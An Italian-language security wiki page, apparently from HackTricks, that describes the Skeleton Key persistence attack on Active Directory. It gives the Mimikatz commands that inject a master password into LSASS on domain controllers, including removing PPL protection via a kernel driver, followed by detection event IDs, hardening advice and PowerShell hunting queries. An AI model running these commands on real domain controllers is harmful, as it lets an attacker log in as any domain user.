# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

L'**Skeleton Key attack** è una tecnica che permette agli attaccanti di **bypassare l'autenticazione di Active Directory** **iniettando una password master** nel processo LSASS di ogni domain controller. Dopo l'iniezione, la password master (default **`mimikatz`**) può essere usata per autenticarsi come **qualsiasi utente di dominio** mentre le loro password reali continuano a funzionare.

Key facts:

- Richiede **Domain Admin/SYSTEM + SeDebugPrivilege** su ogni DC e deve essere **riapplicata dopo ogni riavvio**.
- Modifica i percorsi di validazione di **NTLM** e **Kerberos RC4 (etype 0x17)**; i realm solo AES o gli account che forzano AES **non accetteranno lo Skeleton Key**.
- Può entrare in conflitto con pacchetti di autenticazione LSA di terze parti o con provider aggiuntivi di smart‑card / MFA.
- Il modulo Mimikatz accetta lo switch opzionale `/letaes` per evitare di toccare gli hook Kerberos/AES in caso di problemi di compatibilità.

### Esecuzione

Classico, LSASS non protetto da PPL:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Se **LSASS is running as PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), è necessario un driver del kernel per rimuovere la protezione prima di eseguire il patching di LSASS:
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Dopo l'iniezione, autenticarsi con qualsiasi account di dominio ma usare la password `mimikatz` (o il valore impostato dall'operatore). Ricordare di ripetere su **tutti i DC** in ambienti multi‑DC.

## Mitigazioni

- **Monitoraggio dei log**
- System **Event ID 7045** (installazione servizio/driver) per driver non firmati come `mimidrv.sys`.
- **Sysmon**: Event ID 7 (caricamento driver) per `mimidrv.sys`; Event ID 10 per accessi sospetti a `lsass.exe` da processi non‑di‑sistema.
- Security **Event ID 4673/4611** per uso di privilegi sensibili o anomalie nella registrazione di pacchetti di autenticazione LSA; correlare con accessi 4624 inaspettati che usano RC4 (etype 0x17) provenienti dai DC.
- **Rafforzamento di LSASS**
- Tenere abilitati **RunAsPPL/Credential Guard/Secure LSASS** sui DC per costringere gli attaccanti a distribuire driver in modalità kernel (più telemetria, sfruttamento più difficile).
- Disabilitare il legacy **RC4** dove possibile; limitare i ticket Kerberos ad AES previene il percorso di hook RC4 usato dallo skeleton key.
- Ricerche rapide in PowerShell:
- Detect unsigned kernel driver installs: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Hunt for Mimikatz driver: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Verificare che PPL sia applicato dopo il riavvio: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Per ulteriori indicazioni sul rafforzamento delle credenziali consultare [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## Riferimenti

- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
